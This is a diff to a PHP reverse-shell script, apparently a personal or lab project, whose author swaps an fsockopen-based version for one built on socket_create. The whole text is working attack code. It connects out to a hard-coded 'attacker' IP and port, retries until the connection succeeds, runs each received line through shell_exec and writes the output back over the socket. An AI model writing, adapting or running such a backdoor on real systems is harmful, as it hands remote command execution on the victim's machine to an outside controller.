@@ -4,52 +4,61 @@
  * Author:            Geomancer
  */
 
-// create an outbound connection to attacker
-function open_connection($attacker_ip, $attacker_port, $timeout){
-    $fp = fsockopen($attacker_ip, $attacker_port, $errno, $errstr, $timeout);
-    return $fp;
-}
-
 $attacker_ip = "192.168.56.105";
 $attacker_port = 9300;
-$timeout = 5;
 
-// establish connection
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+
+if ($socket === false) {
+    fwrite(STDERR, "socket_create failed: " . socket_strerror(socket_last_error()) . "\n");
+    exit(1);
+}
+
+while((@socket_connect($socket, $attacker_ip, $attacker_port) === false)){
+    sleep(5);
+}
+
 while(true){
-    $connection = open_connection($attacker_ip, $attacker_port, $timeout);
-    if(!$connection and $attempts < 3){
-        $attempts = $attempts + 1;
-        sleep($timeout);
-    }else if ($connection and $attempts >= 3){
-        $attempts = 0;
-        sleep(3600 * 12);
-    }else{
+    
+    // receive 
+    $res = socket_read($socket, 4096, PHP_BINARY_READ);
+
+    if($res == false){
+        fwrite(STDERR, "socket_read failed\n");
         break;
     }
-}
-
-// wait for bytes
-stream_set_timeout($connection, 5);
-
-$response = '';
-
-// Loop until the server closes the connection (End of File)
-while (!feof($connection)) {
-    $buffer = fgets($connection, 4096);
-    $response .= $buffer;
     
-    // Check if the stream timed out during this read cycle
-    $info = stream_get_meta_data($connection);
-    if ($info['timed_out']) {
-        $connection = open_connection($attacker_ip, $attacker_port, $timeout);
+    $res = rtrim($res, "\r\n");
+
+    // exec
+    $output = shell_exec($res);
+    if($output !== null){
+        $output = "[+] Client says: \n". $output;
+    }else{
+        $output = "[-] Command failed or no output recieved";
+    }
+    // send
+    $output = $output . "\n";
+    $len = strlen($output);
+    $sent = 0;
+
+    while($sent < $len){
+        $n = socket_write(
+            $socket,
+            substr($output, $sent),
+            $len - $sent
+        );
+
+        if($n === false){
+            fwrite(
+                STDERR,
+                "socket_write failed: ",
+                socket_strerror(socket_last_error($socket))."\n"
+            );
+        }
+        $sent += $n;
     }
 
-    $output = shell_exec($response);
-
-    // send output back
-    fwrite($connection, $output);
 }
-
-fclose($connection);
 
 ?>
